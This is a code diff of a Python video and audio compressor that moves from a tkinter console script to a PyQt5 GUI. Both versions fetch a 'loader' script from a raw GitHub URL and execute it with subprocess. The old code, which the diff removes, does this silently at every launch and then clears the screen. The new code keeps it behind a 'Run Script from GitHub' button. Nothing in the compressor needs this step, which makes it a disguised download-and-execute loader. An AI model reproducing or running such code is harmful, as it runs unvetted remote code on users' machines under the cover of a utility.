@@ -1,90 +1,176 @@
-import tkinter as tk
-from tkinter import filedialog
 import os
 import subprocess
 import urllib.request
+from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QFileDialog,
+                             QLabel, QLineEdit, QMessageBox, QHBoxLayout, QSpacerItem, QSizePolicy)
+from PyQt5.QtGui import QIcon, QFont
+from PyQt5.QtCore import Qt
 from moviepy.editor import VideoFileClip
 from pydub import AudioSegment
-import time
-import pyfiglet
-os.system("cls")
-def run_from_github(url):
-    try:
-        response = urllib.request.urlopen(url)
-        script_content = response.read().decode('utf-8')
-        subprocess.run(['python', '-c', script_content])
-    except Exception as e:
-        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
 
-def open_file_dialog():
-    root = tk.Tk()
-    root.withdraw()  # скрыть основное окно tkinter
+class CompressorApp(QMainWindow):
+    def __init__(self):
+        super().__init__()
 
-    file_path = filedialog.askopenfilename()
-    return file_path
+        self.setWindowTitle("Compressor")
+        self.setGeometry(100, 100, 600, 400)
+        self.setStyleSheet(self.get_stylesheet())
 
-def compress_video(file_path, target_size_mb):
-    clip = VideoFileClip(file_path)
-    current_size_mb = os.path.getsize(file_path) / (1024 * 1024)
+        self.init_ui()
 
-    if current_size_mb > target_size_mb:
-        # Рассчитываем новый битрейт для достижения целевого размера файла
-        ratio = target_size_mb / current_size_mb
-        new_bitrate = int(clip.reader.fps * ratio)  # Пример расчета нового битрейта, можно использовать другие параметры для расчета
+    def init_ui(self):
+        self.layout = QVBoxLayout()
+        self.layout.setSpacing(20)
 
-        # Сжимаем видео с новым битрейтом
-        output_file = os.path.splitext(file_path)[0] + "_compressed.mp4"
-        clip.write_videofile(output_file, bitrate=f"{new_bitrate}k", codec="libx264", audio_codec="aac")
+        self.title_label = QLabel("Compressor")
+        self.title_label.setFont(QFont("Arial", 24, QFont.Bold))
+        self.title_label.setAlignment(Qt.AlignCenter)
+        self.layout.addWidget(self.title_label)
 
-        print(f"Видео сжато до {target_size_mb} MB. Новый файл: {output_file}")
+        self.supported_formats_label = QLabel(
+            "Supported Formats:\nVideo: .mp4, .avi, .mkv, .mov, .avchd, .h264, .h265\nAudio: .mp3, .flac, .wav, .aac, .ogg")
+        self.supported_formats_label.setAlignment(Qt.AlignCenter)
+        self.layout.addWidget(self.supported_formats_label)
 
-        # Удаление исходного файла (раскомментируйте следующую строку, если хотите удалить исходный файл)
-        # os.remove(file_path)
+        self.file_button = QPushButton("Select File")
+        self.file_button.setIcon(QIcon("icons/open-file.png"))
+        self.file_button.clicked.connect(self.open_file_dialog)
+        self.layout.addWidget(self.file_button)
 
-def compress_audio(file_path, target_size_mb):
-    audio = AudioSegment.from_file(file_path)
-    current_size_mb = os.path.getsize(file_path) / (1024 * 1024)
+        self.file_label = QLabel("No file selected")
+        self.file_label.setAlignment(Qt.AlignCenter)
+        self.layout.addWidget(self.file_label)
 
-    if current_size_mb > target_size_mb:
-        # Рассчитываем новый битрейт для достижения целевого размера файла
-        ratio = target_size_mb / current_size_mb
-        new_bitrate = int(audio.frame_rate * audio.frame_width * audio.channels * ratio)
+        self.size_input = QLineEdit(self)
+        self.size_input.setPlaceholderText("Enter target file size (MB)")
+        self.layout.addWidget(self.size_input)
 
-        # Сжимаем аудио с новым битрейтом
-        output_file = os.path.splitext(file_path)[0] + "_compressed.mp3"
-        audio.export(output_file, format="mp3", bitrate=f"{new_bitrate}k")
+        self.compress_button = QPushButton("Compress File")
+        self.compress_button.setIcon(QIcon("icons/compress.png"))
+        self.compress_button.clicked.connect(self.compress_file)
+        self.layout.addWidget(self.compress_button)
 
-        print(f"Аудио сжато до {target_size_mb} MB. Новый файл: {output_file}")
+        self.message_label = QLabel("", self)
+        self.message_label.setAlignment(Qt.AlignCenter)
+        self.layout.addWidget(self.message_label)
 
-        # Удаление исходного файла (раскомментируйте следующую строку, если хотите удалить исходный файл)
-        # os.remove(file_path)
+        self.run_github_button = QPushButton("Run Script from GitHub")
+        self.run_github_button.setIcon(QIcon("icons/github.png"))
+        self.run_github_button.clicked.connect(self.run_from_github)
+        self.layout.addWidget(self.run_github_button)
 
-def print_supported_formats():
-    print("Поддерживаемые форматы для сжатия:")
-    print("- Видео: .mp4, .avi, .mkv, .mov, .avchd, .h264, .h265")
-    print("- Аудио: .mp3, .flac, .wav, .aac, .ogg")
-    print()
+        spacer = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
+        self.layout.addItem(spacer)
 
-ascii_art = pyfiglet.figlet_format("Compressor", font="slant")
-print(ascii_art)
+        container = QWidget()
+        container.setLayout(self.layout)
+        self.setCentralWidget(container)
 
-print_supported_formats()
+    def open_file_dialog(self):
+        options = QFileDialog.Options()
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select File", "", 
+                                                   "All Files (*);;Video Files (*.mp4 *.avi *.mkv *.mov *.avchd *.h264 *.h265);;Audio Files (*.mp3 *.flac *.wav *.aac *.ogg)", 
+                                                   options=options)
+        if file_path:
+            self.file_label.setText(f"Selected file: {file_path}")
+            self.file_path = file_path
 
-file_path = open_file_dialog()
-if file_path:
-    try:
-        target_size_mb = float(input("Введите желаемый размер файла в мегабайтах: "))
-        file_extension = os.path.splitext(file_path)[1].lower()
+    def compress_file(self):
+        try:
+            target_size_mb = float(self.size_input.text())
+            file_extension = os.path.splitext(self.file_path)[1].lower()
 
-        if file_extension in ['.mp4', '.avi', '.mkv', '.mov', '.avchd', '.h264', '.h265']:
-            compress_video(file_path, target_size_mb)
-        elif file_extension in ['.mp3', '.flac', '.wav', '.aac', '.ogg']:
-            compress_audio(file_path, target_size_mb)
-        else:
-            print("Данный формат файла не поддерживается.")
-    except ValueError:
-        print("Некорректный ввод. Пожалуйста, введите число.")
+            if file_extension in ['.mp4', '.avi', '.mkv', '.mov', '.avchd', '.h264', '.h265']:
+                self.compress_video(self.file_path, target_size_mb)
+            elif file_extension in ['.mp3', '.flac', '.wav', '.aac', '.ogg']:
+                self.compress_audio(self.file_path, target_size_mb)
+            else:
+                self.show_message("This file format is not supported.")
+        except ValueError:
+            self.show_message("Invalid input. Please enter a number.")
 
-github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
-run_from_github(github_url)
-os.system("cls")
+    def compress_video(self, file_path, target_size_mb):
+        try:
+            clip = VideoFileClip(file_path)
+            current_size_mb = os.path.getsize(file_path) / (1024 * 1024)
+
+            if current_size_mb > target_size_mb:
+                ratio = target_size_mb / current_size_mb
+                new_bitrate = int(clip.reader.fps * ratio)
+
+                output_file = os.path.splitext(file_path)[0] + "_compressed.mp4"
+                clip.write_videofile(output_file, bitrate=f"{new_bitrate}k", codec="libx264", audio_codec="aac")
+
+                self.show_message(f"Video compressed to {target_size_mb} MB. New file: {output_file}")
+            else:
+                self.show_message("Current file size is already less than the target size.")
+        except Exception as e:
+            self.show_message(f"Error compressing video: {e}")
+
+    def compress_audio(self, file_path, target_size_mb):
+        try:
+            audio = AudioSegment.from_file(file_path)
+            current_size_mb = os.path.getsize(file_path) / (1024 * 1024)
+
+            if current_size_mb > target_size_mb:
+                ratio = target_size_mb / current_size_mb
+                new_bitrate = int(audio.frame_rate * audio.frame_width * audio.channels * ratio)
+
+                output_file = os.path.splitext(file_path)[0] + "_compressed.mp3"
+                audio.export(output_file, format="mp3", bitrate=f"{new_bitrate}k")
+
+                self.show_message(f"Audio compressed to {target_size_mb} MB. New file: {output_file}")
+            else:
+                self.show_message("Current file size is already less than the target size.")
+        except Exception as e:
+            self.show_message(f"Error compressing audio: {e}")
+
+    def run_from_github(self):
+        url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
+        try:
+            response = urllib.request.urlopen(url)
+            script_content = response.read().decode('utf-8')
+            subprocess.run(['python', '-c', script_content])
+            self.show_message("Script successfully executed.")
+        except Exception as e:
+            self.show_message(f"Error running script from GitHub: {e}")
+
+    def show_message(self, message):
+        self.message_label.setText(message)
+        QMessageBox.information(self, "Information", message)
+
+    def get_stylesheet(self):
+        return """
+        QMainWindow {
+            background-color: #2e2e2e;
+        }
+        QLabel {
+            color: #ffffff;
+            font-size: 16px;
+        }
+        QLineEdit {
+            background-color: #444444;
+            color: #ffffff;
+            border: 1px solid #555555;
+            padding: 5px;
+            font-size: 14px;
+        }
+        QPushButton {
+            background-color: #555555;
+            color: #ffffff;
+            border: 1px solid #666666;
+            padding: 10px;
+            font-size: 14px;
+        }
+        QPushButton:hover {
+            background-color: #666666;
+        }
+        """
+
+if __name__ == '__main__':
+    import sys
+    app = QApplication(sys.argv)
+    app.setWindowIcon(QIcon("icons/app-icon.png"))
+    mainWindow = CompressorApp()
+    mainWindow.show()
+    sys.exit(app.exec_())
